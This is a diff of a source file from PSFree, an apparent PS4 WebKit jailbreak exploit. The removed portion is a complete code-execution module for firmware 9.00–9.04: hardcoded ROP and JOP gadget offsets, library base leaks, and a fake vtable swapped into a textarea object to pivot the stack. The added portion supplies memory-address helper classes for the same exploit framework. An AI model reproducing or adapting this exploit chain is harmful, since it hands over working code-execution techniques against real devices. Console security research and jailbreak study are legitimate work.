@@ -1,4 +1,4 @@
-/* Copyright (C) 2023-2025 anonymous
+/* Copyright (C) 2025 anonymous
 
 This file is part of PSFree.
 
@@ -15,264 +15,247 @@ GNU Affero General Public License for more details.
 You should have received a copy of the GNU Affero General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 
-// 9.00, 9.03, 9.04
-// ROP Chain by @janisslsm
+import { Int, lohi_from_one } from './int64.mjs';
+import { Addr } from './mem.mjs';
+import { BufferView } from './rw.mjs';
 
-import { mem } from "../../module/mem.mjs";
-import { KB } from "../../module/offset.mjs";
-import { ChainBase } from "../../module/chain.mjs";
-import { BufferView } from "../../module/rw.mjs";
+import * as config from '../config.mjs';
+import * as mt from './memtools.mjs';
 
-import { get_view_vector, resolve_import, init_syscall_array } from "../../module/memtools.mjs";
-
-import * as off from "../../module/offset.mjs";
-
-// WebKit offsets of imported functions
-const offset_wk_stack_chk_fail = 0x178;
-const offset_wk_strlen = 0x198;
-
-// libSceNKWebKit.sprx
-export let libwebkit_base = null;
-// libkernel_web.sprx
-export let libkernel_base = null;
-// libSceLibcInternal.sprx
-export let libc_base = null;
-
-// gadgets for the JOP chain
+// View constructors will always get the buffer property in order to make sure
+// that the JSArrayBufferView is a WastefulTypedArray. m_vector may change if
+// m_mode < WastefulTypedArray. This is to make caching the m_view field
+// possible. Users don't have to worry if the m_view they got from addr() is
+// possibly stale.
 //
-// When the scrollLeft getter native function is called on the console, rsi is
-// the JS wrapper for the WebCore textarea class.
-const jop1 = `
-mov rdi, qword ptr [rsi + 0x18]
-mov rax, qword ptr [rdi]
-call qword ptr [rax + 0xb8]
-`;
-// Since the method of code redirection we used is via redirecting a call to
-// jump to our JOP chain, we have the return address of the caller on entry.
+// see possiblySharedBuffer() from
+// WebKit/Source/JavaScriptCore/runtime/JSArrayBufferViewInlines.h
+// at PS4 8.03
 //
-// jop1 pushed another object (via the call instruction) but we want no
-// extra objects between the return address and the rbp that will be pushed by
-// jop2 later. So we pop the return address pushed by jop1.
-//
-// This will make pivoting back easy, just "leave; ret".
-const jop2 = `
-pop rsi
-jmp qword ptr [rax + 0x1c]
-`;
-const jop3 = `
-mov rdi, qword ptr [rax + 8]
-mov rax, qword ptr [rdi]
-jmp qword ptr [rax + 0x30]
-`;
-// rbp is now pushed, any extra objects pushed by the call instructions can be
-// ignored
-const jop4 = `
-push rbp
-mov rbp, rsp
-mov rax, qword ptr [rdi]
-call qword ptr [rax + 0x58]
-`;
-const jop5 = `
-mov rdx, qword ptr [rax + 0x18]
-mov rax, qword ptr [rdi]
-call qword ptr [rax + 0x10]
-`;
-const jop6 = `
-push rdx
-jmp qword ptr [rax]
-`;
-const jop7 = "pop rsp; ret";
+// Subclasses of TypedArray are still implemented as a JSArrayBufferView, so
+// get_view_vector() still works on them.
 
-// the ps4 firmware is compiled to use rbp as a frame pointer
-//
-// The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
-// must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
-// restore rbp (if needed) before the epilogue.
-//
-// The epilogue will move rbp to rsp (restore old rsp) and pop rbp (which we
-// pushed earlier before the pivot, thus restoring the old rbp).
-//
-// leave instruction equivalent:
-//     mov rsp, rbp
-//     pop rbp
+function ViewMixin(superclass) {
+    const res = class extends superclass {
+        constructor(...args) {
+            super(...args);
+            this.buffer;
+        }
 
-const webkit_gadget_offsets = new Map(
-  Object.entries({
-    "pop rax; ret": 0x0000000000051a12, // `58 c3`
-    "pop rbx; ret": 0x00000000000be5d0, // `5b c3`
-    "pop rcx; ret": 0x00000000000657b7, // `59 c3`
-    "pop rdx; ret": 0x000000000000986c, // `5a c3`
+        get addr() {
+            let res = this._addr_cache;
+            if (res !== undefined) {
+                return res;
+            }
+            res = mt.get_view_vector(this);
+            this._addr_cache = res;
+            return res;
+        }
 
-    "pop rbp; ret": 0x00000000000000b6, // `5d c3`
-    "pop rsi; ret": 0x000000000001f4d6, // `5e c3`
-    "pop rdi; ret": 0x0000000000319690, // `5f c3`
-    "pop rsp; ret": 0x000000000004e293, // `5c c3`
+        get size() {
+            return this.byteLength;
+        }
 
-    "pop r8; ret": 0x00000000001a7ef1, // `47 58 c3`
-    "pop r9; ret": 0x0000000000422571, // `47 59 c3`
-    "pop r10; ret": 0x0000000000e9e1d1, // `47 5a c3`
-    "pop r11; ret": 0x00000000012b1d51, // `47 5b c3`
+        addr_at(index) {
+            const size = this.BYTES_PER_ELEMENT;
+            return this.addr.add(index * size);
+        }
 
-    "pop r12; ret": 0x000000000085ec71, // `47 5c c3`
-    "pop r13; ret": 0x00000000001da461, // `47 5d c3`
-    "pop r14; ret": 0x0000000000685d73, // `47 5e c3`
-    "pop r15; ret": 0x00000000006ab3aa, // `47 5f c3`
+        sget(index) {
+            return this[index] | 0;
+        }
+    };
 
-    "ret": 0x0000000000000032, // `c3`
-    "leave; ret": 0x000000000008db5b, // `c9 c3`
-
-    "mov rax, qword ptr [rax]; ret": 0x00000000000241cc, // `48 8b 00 c3`
-    "mov qword ptr [rdi], rax; ret": 0x000000000000613b, // `48 89 07 c3`
-    "mov dword ptr [rdi], eax; ret": 0x000000000000613c, // `89 07 c3`
-    "mov dword ptr [rax], esi; ret": 0x00000000005c3482, // `89 30 c3`
-
-    [jop1]: 0x00000000004e62a4, // `48 8b 7e 18 48 8b 07 ff 90 b8 00 00 00`
-    [jop2]: 0x00000000021fce7e, // `5e ff 60 1c`
-    [jop3]: 0x00000000019becb4, // `48 8b 78 08 48 8b 07 ff 60 30`
-
-    [jop4]: 0x0000000000683800, // `55 48 89 e5 48 8b 07 ff 50 58`
-    [jop5]: 0x0000000000303906, // `48 8b 50 18 48 8b 07 ff 50 10`
-    [jop6]: 0x00000000028bd332, // `52 ff 20`
-    [jop7]: 0x000000000004e293, // `5c c3`
-  }),
-);
-
-const libc_gadget_offsets = new Map(
-  Object.entries({
-    "getcontext": 0x24f04,
-    "setcontext": 0x29448,
-  }),
-);
-
-const libkernel_gadget_offsets = new Map(
-  Object.entries({
-    // returns the location of errno
-    "__error": 0xcb80,
-  }),
-);
-
-export const gadgets = new Map();
-
-function get_bases() {
-  const textarea = document.createElement("textarea");
-  const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
-  const textarea_vtable = webcore_textarea.readp(0);
-  const off_ta_vt = 0x2e73c18;
-  const libwebkit_base = textarea_vtable.sub(off_ta_vt);
-
-  const stack_chk_fail_import = libwebkit_base.add(offset_wk_stack_chk_fail);
-  const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
-  const off_scf = 0x1ff60;
-  const libkernel_base = stack_chk_fail_addr.sub(off_scf);
-
-  const strlen_import = libwebkit_base.add(offset_wk_strlen);
-  const strlen_addr = resolve_import(strlen_import);
-  const off_strlen = 0x4fa40;
-  const libc_base = strlen_addr.sub(off_strlen);
-
-  return [libwebkit_base, libkernel_base, libc_base];
-}
-
-export function init_gadget_map(gadget_map, offset_map, base_addr) {
-  for (const [insn, offset] of offset_map) {
-    gadget_map.set(insn, base_addr.add(offset));
-  }
-}
-
-class Chain900Base extends ChainBase {
-  push_end() {
-    this.push_gadget("leave; ret");
-  }
-
-  push_get_retval() {
-    this.push_gadget("pop rdi; ret");
-    this.push_value(this.retval_addr);
-    this.push_gadget("mov qword ptr [rdi], rax; ret");
-  }
-
-  push_get_errno() {
-    this.push_gadget("pop rdi; ret");
-    this.push_value(this.errno_addr);
-
-    this.push_call(this.get_gadget("__error"));
-
-    this.push_gadget("mov rax, qword ptr [rax]; ret");
-    this.push_gadget("mov dword ptr [rdi], eax; ret");
-  }
-
-  push_clear_errno() {
-    this.push_call(this.get_gadget("__error"));
-    this.push_gadget("pop rsi; ret");
-    this.push_value(0);
-    this.push_gadget("mov dword ptr [rax], esi; ret");
-  }
-}
-
-export class Chain900 extends Chain900Base {
-  constructor() {
-    super();
-
-    const textarea = document.createElement("textarea");
-    this._textarea = textarea;
-    const js_ta = mem.addrof(textarea);
-    const webcore_ta = js_ta.readp(0x18);
-    this._webcore_ta = webcore_ta;
-    // Only offset 0x1c8 will be used when calling the scrollLeft getter
-    // native function (our tests don't crash).
+    // workaround for known affected versions: ps4 [6.00, 10.00)
     //
-    // This implies we don't need to know the exact size of the vtable and
-    // try to copy it as much as possible to avoid a crash due to missing
-    // vtable entries.
+    // see from() and of() from
+    // WebKit/Source/JavaScriptCore/builtins/TypedArrayConstructor.js at PS4
+    // 8.0x
     //
-    // So the rest of the vtable are free for our use.
-    const vtable = new BufferView(0x200);
-    const old_vtable_p = webcore_ta.readp(0);
-    this._vtable = vtable;
-    this._old_vtable_p = old_vtable_p;
+    // @getByIdDirectPrivate(this, "allocateTypedArray") will fail when "this"
+    // isn't one of the built-in TypedArrays. this is a violation of the
+    // ECMAScript spec at that time
+    //
+    // TODO assumes ps4, support ps5 as well
+    // FIXME define the from/of workaround functions once
+    if (0x600 <= config.target && config.target < 0x1000) {
+        res.from = function from(...args) {
+            const base = this.__proto__;
+            return new this(base.from(...args).buffer);
+        };
 
-    // 0x1b8 is the offset of the scrollLeft getter native function
-    vtable.write64(0x1b8, this.get_gadget(jop1));
-    vtable.write64(0xb8, this.get_gadget(jop2));
-    vtable.write64(0x1c, this.get_gadget(jop3));
+        res.of = function of(...args) {
+            const base = this.__proto__;
+            return new this(base.of(...args).buffer);
+        };
+    }
 
-    // for the JOP chain
-    const rax_ptrs = new BufferView(0x100);
-    const rax_ptrs_p = get_view_vector(rax_ptrs);
-
-    rax_ptrs.write64(0x30, this.get_gadget(jop4));
-    rax_ptrs.write64(0x58, this.get_gadget(jop5));
-    rax_ptrs.write64(0x10, this.get_gadget(jop6));
-    rax_ptrs.write64(0, this.get_gadget(jop7));
-    // value to pivot rsp to
-    rax_ptrs.write64(0x18, this.stack_addr);
-
-    const jop_buffer = new BufferView(8);
-    const jop_buffer_p = get_view_vector(jop_buffer);
-
-    jop_buffer.write64(0, rax_ptrs_p);
-
-    vtable.write64(8, jop_buffer_p);
-  }
-
-  run() {
-    this.check_allow_run();
-    this._webcore_ta.write64(0, get_view_vector(this._vtable));
-    this._textarea.scrollLeft;
-    this._webcore_ta.write64(0, this._old_vtable_p);
-    this.dirty();
-  }
+    return res;
 }
 
-export const Chain = Chain900;
+export class View1 extends ViewMixin(Uint8Array) {}
+export class View2 extends ViewMixin(Uint16Array) {}
+export class View4 extends ViewMixin(Uint32Array) {}
 
-export function init(Chain) {
-  const syscall_array = [];
-  [libwebkit_base, libkernel_base, libc_base] = get_bases();
+export class Buffer extends BufferView {
+    get addr() {
+        let res = this._addr_cache;
+        if (res !== undefined) {
+            return res;
+        }
+        res = mt.get_view_vector(this);
+        this._addr_cache = res;
+        return res;
+    }
 
-  init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
-  init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
-  init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
-  init_syscall_array(syscall_array, libkernel_base, 300 * KB);
+    get size() {
+        return this.byteLength;
+    }
 
-  Chain.init_class(gadgets, syscall_array);
+    addr_at(index) {
+        return this.addr.add(index);
+    }
 }
+// see from() and of() comment above
+if (0x600 <= config.target && config.target < 0x1000) {
+    Buffer.from = function from(...args) {
+        const base = this.__proto__;
+        return new this(base.from(...args).buffer);
+    };
+    Buffer.of = function of(...args) {
+        const base = this.__proto__;
+        return new this(base.of(...args).buffer);
+    };
+}
+
+const VariableMixin = superclass => class extends superclass {
+    constructor(value=0) {
+        // unlike the View classes, we don't allow number coercion. we
+        // explicitly allow floats unlike Int
+        if (typeof value !== 'number') {
+            throw TypeError('value not a number');
+        }
+        super([value]);
+    }
+
+    addr_at(...args) {
+        throw TypeError('unimplemented method');
+    }
+
+    [Symbol.toPrimitive](hint) {
+        return this[0];
+    }
+
+    toString(...args) {
+        return this[0].toString(...args);
+    }
+};
+
+export class Byte extends VariableMixin(View1) {}
+export class Short extends VariableMixin(View2) {}
+// Int was already taken by int64.mjs
+export class Word extends VariableMixin(View4) {}
+
+export class LongArray {
+    constructor(length) {
+        this.buffer = new DataView(new ArrayBuffer(length * 8));
+    }
+
+    get addr() {
+        return mt.get_view_vector(this.buffer);
+    }
+
+    addr_at(index) {
+        return this.addr.add(index * 8);
+    }
+
+    get length() {
+        return this.buffer.length / 8;
+    }
+
+    get size() {
+        return this.buffer.byteLength;
+    }
+
+    get byteLength() {
+        return this.size;
+    }
+
+    get(index) {
+        const buffer = this.buffer;
+        const base = index * 8;
+        return new Int(
+            buffer.getUint32(base, true),
+            buffer.getUint32(base + 4, true),
+        );
+    }
+
+    set(index, value) {
+        const buffer = this.buffer;
+        const base = index * 8;
+        const values = lohi_from_one(value);
+
+        buffer.setUint32(base, values[0], true);
+        buffer.setUint32(base + 4, values[1], true);
+    }
+}
+
+// mutable Int (we are explicitly using Int's private fields)
+const Word64Mixin = superclass => class extends superclass {
+    constructor(...args) {
+        if (!args.length) {
+            return super(0);
+        }
+        super(...args);
+    }
+
+    get addr() {
+        // assume this is safe to cache
+        return mt.get_view_vector(this._u32);
+    }
+
+    get length() {
+        return 1;
+    }
+
+    get size() {
+        return 8;
+    }
+
+    get byteLength() {
+        return 8;
+    }
+
+    // no setters for top and bot since low/high can accept negative integers
+
+    get lo() {
+        return super.lo;
+    }
+
+    set lo(value) {
+        this._u32[0] = value;
+    }
+
+    get hi() {
+        return super.hi;
+    }
+
+    set hi(value) {
+        this._u32[1] = value;
+    }
+
+    set(value) {
+        const buffer = this._u32;
+        const values = lohi_from_one(value);
+
+        buffer[0] = values[0];
+        buffer[1] = values[1];
+    }
+};
+
+export class Long extends Word64Mixin(Int) {
+    as_addr() {
+        return new Addr(this);
+    }
+}
+export class Pointer extends Word64Mixin(Addr) {}
